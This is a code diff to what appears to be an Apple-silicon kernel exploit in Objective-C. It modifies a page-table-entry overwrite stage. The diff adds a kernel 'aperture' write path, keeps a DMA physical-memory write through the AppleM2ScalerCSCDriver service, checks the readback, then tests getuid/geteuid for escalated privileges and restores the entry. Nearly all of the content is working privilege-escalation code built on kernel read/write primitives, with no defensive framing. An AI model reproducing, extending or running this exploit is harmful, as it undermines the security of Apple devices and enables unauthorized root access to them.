@@ -3517,14 +3517,14 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 kpNote(r, [NSString stringWithFormat:@"  [C3W] cand pa=%#llx off=+%#x t=%d inDART=%d val=%#018llx",
                           (unsigned long long)pa, o, t, inDart, (unsigned long long)q]);
                 BOOL better = (!hitPA)
-                    || (inDart && !hitDart)
-                    || (inDart && hitDart && t == 0x21 && hitType != 0x21);
+                    || (t == 0x21 && hitType != 0x21)
+                    || (t == 0x21 && hitType == 0x21 && !inDart && hitDart);
                 if (better) {
                     hitPA = pa; hitOff = o; hitType = t; hitVal = q;
                     hitTableVA = al; hitDart = inDart;
                 }
-                // Done: writable heap PTE in DART is the prize.
-                if (inDart && t == 0x21) { pass = 2; break; }
+                // Real walker table is often type 0x21 outside DART heap copies.
+                if (t == 0x21 && !inDart) { pass = 2; break; }
             }
         }
     }
@@ -3578,8 +3578,16 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                   (unsigned long long)ttM, (unsigned long long)isTable]);
     }
 
-    BOOL dmaOK = NO;
-    if (ptePage && ttM && isTable) {
+    BOOL wrote = NO;
+    // 2.0.155: aperture write when the table page is type 0x21 (field: DMA into
+    // DART heap copies does not change walker). DMA only for non-0x21 pages.
+    if (hitType == 0x21 && hitTableVA) {
+        uint64_t pteVA = hitTableVA + hitOff;
+        krw_zone_verdict zv = krw_zone_write_qword(pteVA, newPte, hitTableVA, 0x4000);
+        kpNote(r, [NSString stringWithFormat:@"  [C3W] aperture write va=%#llx zv=%d payload=%#018llx",
+                  (unsigned long long)pteVA, (int)zv, (unsigned long long)newPte]);
+        wrote = (zv == KRW_ZONE_OK);
+    } else if (ptePage && ttM && isTable) {
         io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                        IOServiceMatching("AppleM2ScalerCSCDriver"));
         if (svc) {
@@ -3589,18 +3597,18 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             *(uint32_t *)(tsd + 0x10) = 32;
             kpNote(r, [NSString stringWithFormat:@"  [C3W] DMA write ptePA=%#llx off=%#x payload=%#018llx",
                       (unsigned long long)ptePage, pteOff, (unsigned long long)newPte]);
-            dmaOK = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, newPte, r);
+            wrote = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, newPte, r);
             IOObjectRelease(svc);
         } else {
             kpNote(r, @"  [C3W] M2Scaler нет");
         }
     } else {
-        kpNote(r, @"  [C3W] DMA ctx incomplete");
+        kpNote(r, @"  [C3W] write path incomplete");
     }
 
     uint64_t rbP = hitTableVA ? early_kread64(hitTableVA + hitOff) : 0;
-    kpNote(r, [NSString stringWithFormat:@"  [C3W] DMA=%d readback=%#018llx (ждём %#018llx) %@",
-              (int)dmaOK, (unsigned long long)rbP, (unsigned long long)newPte,
+    kpNote(r, [NSString stringWithFormat:@"  [C3W] wrote=%d readback=%#018llx (ждём %#018llx) %@",
+              (int)wrote, (unsigned long long)rbP, (unsigned long long)newPte,
               rbP == newPte ? @"ПРИЛИПЛО" : @"МИМО"]);
 
     uid_t u1 = getuid(), e1 = geteuid();
@@ -3611,20 +3619,25 @@ static NSString *kpFmtSptmFn(uint64_t raw)
     if (p1) kpNote(r, @"=== P1 ★★ C3-WRITE ===");
 
     // Restore PTE + sac slot (mandatory).
-    if (dmaOK || rbP == newPte) {
-        io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
-                                                       IOServiceMatching("AppleM2ScalerCSCDriver"));
-        if (svc) {
-            uint8_t tsd[0x1B0]; memset(tsd, 0, sizeof(tsd));
-            *(uint32_t *)(tsd + 0x0C) = 32; *(uint32_t *)(tsd + 0x10) = 32;
-            BOOL rest = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, hitVal, r);
-            kpNote(r, [NSString stringWithFormat:@"  [C3W] restore PTE=%d", (int)rest]);
-            IOObjectRelease(svc);
+    if (wrote || rbP == newPte) {
+        if (hitType == 0x21 && hitTableVA) {
+            (void)krw_zone_write_qword(hitTableVA + hitOff, hitVal, hitTableVA, 0x4000);
+            kpNote(r, @"  [C3W] restore PTE (aperture)");
+        } else {
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                           IOServiceMatching("AppleM2ScalerCSCDriver"));
+            if (svc) {
+                uint8_t tsd[0x1B0]; memset(tsd, 0, sizeof(tsd));
+                *(uint32_t *)(tsd + 0x0C) = 32; *(uint32_t *)(tsd + 0x10) = 32;
+                BOOL rest = kpPhysWrite8v2(svc, tsd, ttM, isTable, ptePage, pteOff, hitVal, r);
+                kpNote(r, [NSString stringWithFormat:@"  [C3W] restore PTE=%d", (int)rest]);
+                IOObjectRelease(svc);
+            }
         }
     }
     early_kwrite64(slotVA, slotSave);
-    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=%d DMA=%d HIT_DART=%d SWAP_PTE=%d\n",
-     (int)getuid(), (int)geteuid(), p1 ? 1 : 0, (int)dmaOK, (int)hitDart, rbP == newPte ? 1 : 0];
+    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d P1=%d WROTE=%d HIT_DART=%d HIT_TYPE=0x%x SWAP_PTE=%d\n",
+     (int)getuid(), (int)geteuid(), p1 ? 1 : 0, (int)wrote, (int)hitDart, hitType & 0xff, rbP == newPte ? 1 : 0];
     [r appendString:@"=== C3-WRITE done ===\n"];
     return r;
 }
